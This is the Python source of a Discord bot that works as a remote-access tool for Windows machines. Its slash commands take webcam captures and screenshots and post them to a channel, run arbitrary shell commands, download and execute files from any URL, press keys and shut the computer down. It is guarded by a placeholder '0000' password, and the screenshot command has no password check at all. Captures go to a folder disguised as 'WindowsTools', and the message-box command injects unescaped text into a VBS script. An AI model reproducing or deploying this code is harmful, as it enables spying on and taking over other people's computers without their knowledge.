from datetime import date
from nextcord import SlashOption
from nextcord.ext import commands
import pyautogui as pgui
import requests as re
import webbrowser
import urllib.request
import os
import cv2
import nextcord
import keyboard
import time
import datetime


client = commands.Bot(command_prefix = '$$',intents=nextcord.Intents.all())
version="4.1.0 -github"
print("PROGRAM RUN")
folder=os.path.curdir
folder=os.path.abspath(folder)
df_folder="C:/ProgramData"
computer=open("vol","r")
computer=computer.read()
token="Paste here" #Your token
admp="0000" #Password of administrator (string variable)


def date_time():
    global DateN
    global TimeN
    dt=datetime.datetime.today()
    DateN=f"{dt.year}-{dt.month}-{dt.day}"
    TimeN=f"{dt.hour}-{dt.minute}-{dt.second}"

    
@client.event
async def on_ready():
    global channel
    print("CONNECTED")
    channel=client.get_channel(Paste here) #Your channel id
    await client.change_presence(status=nextcord.Status.online, activity=nextcord.Game("Computer online"))
    await channel.send(f"@everyone\nDesktop #{computer} online now! Yay!\n(Version {version})")

    
@client.slash_command(description="Check status")
async def status(interaction: nextcord.Interaction):
    await channel.send(f"#{computer} work!")


@client.slash_command(description="Power-off computer")
async def power_off(interaction: nextcord.Interaction, num: str= SlashOption(description="Number of computer"), admin: str= SlashOption(description="Admin password")):
    if admin==admp:
        if num==computer or num=="666":
            await channel.send(f"Power-off to #{computer}")
            os.system("shutdown /s /t 0")
    else:
        await interaction.response.send_message(f"You are not admin!")

@client.slash_command(description="screenshot")
async def screenshot(interaction: nextcord.Interaction, num: str= SlashOption(description="Number of computer")):
    if num==computer or num=="666":
        date_time()
        try:
            os.mkdir(f"C:/ProgramData/WindowsTools")
        except:
            print(".")
        try:
            os.mkdir(f"C:/ProgramData/WindowsTools/{DateN}")
        except:
            print(".")
        pgui.screenshot(f"C:/ProgramData/WindowsTools/{DateN}/screen_{TimeN}.png")
        await channel.send(file=nextcord.File(f"C:/ProgramData/WindowsTools/{DateN}/screen_{TimeN}.png"))
        try:
            os.remove(f"C:/ProgramData/WindowsTools/{DateN}/screen_{TimeN}.png")
        except:
            print(".")

@client.slash_command(description="web_cam")
async def web_cam(interaction: nextcord.Interaction, num: str= SlashOption(description="Number of computer"), admin: str= SlashOption(description="Admin password")):
    if admin==admp:
        if num==computer or num=="666":
            try:
                date_time()
                try:
                    os.mkdir(f"C:/ProgramData/WindowsTools")
                except:
                    print(".")
                try:
                    os.mkdir(f"C:/ProgramData/WindowsTools/{DateN}")
                except:
                    print(".")
                cap=cv2.VideoCapture(0)
                cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
                ret, frame=cap.read()
                date_time()
                cv2.imwrite(f"C:/ProgramData/WindowsTools/{DateN}/web_{TimeN}.png", frame)
                cap.release()
                await channel.send(file=nextcord.File(f"C:/ProgramData/WindowsTools/{DateN}/web_{TimeN}.png"))
                try:
                    os.remove(f"C:/ProgramData/WindowsTools/{DateN}/web_{TimeN}.png")
                except:
                    print(".")
            except Exception as err:
                await channel.send(f"Error!: {err}")
    else:
        await interaction.response.send_message(f"You are not admin!")

@client.slash_command(description="cmd_command")
async def cmd_command(interaction: nextcord.Interaction, num: str= SlashOption(description="Number of computer", required=True), command: str= SlashOption(description="Command", required=True), admin: str= SlashOption(description="Admin password")):
    if admin==admp:
        if num==computer or num=="666":
            try:
                cmd=os.system(command)
                if cmd:
                    cmd="Done!"
                else:
                    cmd="Command give you `0`?"
                await channel.send(f"{cmd}")
            except Exception as err:
                await channel.send(f"Error!: {err}")
    else:
        await interaction.response.send_message(f"You are not admin!")

@client.slash_command(description="ricroll")
async def ricroll(interaction: nextcord.Interaction, num: str= SlashOption(description="Number of computer")):
    if num==computer or num=="666":
        webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ",new=2)
        await interaction.response.send_message("Rickrolled!(/screenshot to watch)")


@client.slash_command(description="Open site")
async def site_open(interaction: nextcord.Interaction, num: str= SlashOption(description="Number of computer"), url: str= SlashOption(description="Url of site"), admin: str= SlashOption(description="Admin password")):
    if admin==admp:
        if num==computer or num=="666":
            try:
                webbrowser.get(using='google-chrome').open_new_tab(url)
            except:
                webbrowser.open(url,new=2)
            await channel.send(f"Open site `{url}`")
        else:
            await interaction.response.send_message(f"You are not admin!")


@client.slash_command(description="download a custom file and open it")
async def openfile_url(interaction: nextcord.Interaction, num: str= SlashOption(description="Number of computer"),
                       url: str= SlashOption(description="Url of file"),
                       admin: str= SlashOption(description="Admin password")):
    if num==computer or num=="666":
        if admin==admp:
            try:
                filename = url.split('/')[-1]
                urllib.request.urlretrieve(url,f"C:/ProgramData/{filename}")
                os.startfile(f"C:/ProgramData/{filename}")
                await channel.send(f"Open file {url}")
                time.sleep(10)
                os.remove(f"C:/ProgramData/{filename}")
            except Exception as err:
                await channel.send(f"Error!: {err}")
        else:
            await interaction.response.send_message(f"You are not admin!")

@client.slash_command(description="press key")
async def press_key(interaction: nextcord.Interaction, num: str= SlashOption(description="Number of computer"),
                    key: str= SlashOption(description="Key for press"),
                    admin: str= SlashOption(description="Admin password")):
    if num==computer or num=="666":
        if admin==admp:
            try:
                keyboard.press_and_release(key)
                await channel.send(f"Press key {key} #{computer}")
            except Exception as err:
                await channel.send(f"Error!: {err}")
        else:
            await interaction.response.send_message(f"You are not admin!")

@client.slash_command(description="message box")
async def messagebox(interaction: nextcord.Interaction, num: str= SlashOption(description="Number of computer"),
                    title: str= SlashOption(description="Title of msgbox"),
                    text: str= SlashOption(description="Text of msgbox)"),
                    num_of_msgbox: str= SlashOption(description="Ico and buttons(1+48)"),
                    admin: str= SlashOption(description="Admin password")):
    if admin==admp:
        if num==computer or num=="666":
            try:
                msgboxfile=open("temp_msg.vbs","w")
                msgboxcontent=f'X=MsgBox("{text}",{num_of_msgbox},"{title}")'
                msgboxfile.write(msgboxcontent)
                msgboxfile.close()
                os.startfile("temp_msg.vbs")
                await channel.send(f"Start vbs file on #{computer}:\nTitle: {title}\nText: {text}\nNum_msg_box: {num_of_msgbox}")
                time.sleep(10)
                os.remove(f"temp_msg.vbs")
            except Exception as err:
                await channel.send(f"Error!: {err}")
    else:
        await interaction.response.send_message(f"You are not admin!")


def run_discord():
    print("3 MIN TO CONNECT WIFI")
    time.sleep(3*60)
    try:
        client.run(token)
    except:
        print("CONNECT ERROR!!!!!!!, CONNECT TO WIFI AND RESTART PROGRAM!!!!!!!!!")
run_discord()
